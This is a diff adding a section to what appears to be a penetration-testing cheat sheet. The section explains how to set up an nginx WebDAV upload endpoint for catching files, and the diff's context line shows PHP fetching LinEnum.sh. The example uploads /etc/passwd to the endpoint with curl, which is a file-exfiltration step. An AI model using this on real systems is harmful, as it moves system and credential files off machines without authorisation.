@@ -1493,3 +1493,43 @@ fopen("[url]", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = frea
 
 
 ```
+
+### Catching files over http (nginx)
+```
+  1. Create directory that will handle the file uploads 
+    sudo mkdir -p /var/www/uploads/SecretUploadDirectory
+
+
+  2. Change the owner of that dir 
+    sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory
+
+
+  3. Create and popluate nginx config file.
+    /etc/nginx/sites-available/upload.conf 
+    server {
+      listen 9001;
+      
+      location /SecretUploadDirectory/ {
+          root    /var/www/uploads;
+          dav_methods PUT;
+      }
+    }
+
+
+  4. sym link the dir of the config file to nginx so it knows to use it. If there are other configs in the nginx dir then there will be errors. To avoid this remove any other config files in that dir, and use the diag commands provided below. 
+    sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/
+
+    sudo systemctl restart nginx.service
+
+    #Diag Commands to narrow down error
+    tail -2 /var/log/nginx/error.log
+    ss -lnpt | grep [port of hosted nginx]
+    ps -ef | grep [pid of above command]
+
+
+  5. Upload a file to the nginx server 
+    curl -T /etc/passwd http://localhost:9001/SecretUploadDirectory/users.txt
+
+    # verify upload 
+    ls /var/www/uploads/SecretUploadDirectory/
+```
